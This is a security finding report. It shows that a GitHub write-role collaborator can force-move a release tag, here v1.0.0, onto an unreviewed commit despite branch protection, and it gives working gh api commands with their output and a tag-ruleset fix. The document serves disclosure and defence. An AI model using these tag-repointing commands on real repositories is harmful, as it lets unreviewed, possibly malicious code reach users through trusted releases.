# Write role moves tags/releases past branch protection

High · Verified live · 2026-06-04 · `stefanpenner/tag-release-test`

**Claim:** a `write`-role collaborator, denied direct push to a review-protected
default branch, can repoint the **Latest release tag** to unreviewed code.

## Setup

- `main`: protected — `required_approving_review_count=1`, `enforce_admins=true`
- release `v1.0.0` → `main` `a1c628d` (reviewed)
- branch `attacker` `d17977b` (unreviewed; `app.py` = malicious)
- actor `sjainepenner`: `push=true admin=false maintain=false`

```
ATK=d17977b   # unreviewed attacker commit
```

## Evidence — each claim = command + observed output

**C1. Write CANNOT push to `main`.**
```
$ gh api -X PATCH .../git/refs/heads/main -f sha=$ATK -F force=true
422  "Changes must be made through a pull request."
```

**C2. Write CAN move the release tag to unreviewed code.**
```
$ gh api -X PATCH .../git/refs/tags/v1.0.0 -f sha=$ATK -F force=true
v1.0.0:  a1c628d  ->  d17977b
```

**C3. The Latest release now serves unreviewed code.**
```
$ gh api .../contents/app.py?ref=v1.0.0 --jq .content | base64 -d
print("MALICIOUS unreviewed code")
import os  # pretend backdoor
```

**C4. A tag ruleset (write OFF bypass) blocks the move.**
```
$ gh api -X PATCH .../git/refs/tags/v1.0.0 -f sha=$ATK -F force=true
422  "Repository rule violations found — Cannot update this protected ref."
```

**C5. Same ruleset blocks creating a new release-grade tag.**
```
$ gh api -X POST .../git/refs -f ref=refs/tags/v2.0.0 -f sha=$ATK
422  "Reference update failed."
```

## Root cause

Branch protection and branch-targeted rulesets cover **branches only**; tags are
uncovered. `write` is the create/move/delete permission for tags **and** releases
— no lower role removes it.

## Fix

Repository Ruleset, `target: tag`:
- patterns: `refs/tags/v*`, `refs/tags/latest` (all release-grade names)
- rules: **Restrict creations**, **Restrict updates**, **Restrict deletions**
- bypass actors: admins / release-bot App only — **not** the Write role

Caveat: `make_latest=true` flags any non-draft release as Latest, so the protected
pattern must cover every release-grade tag name.
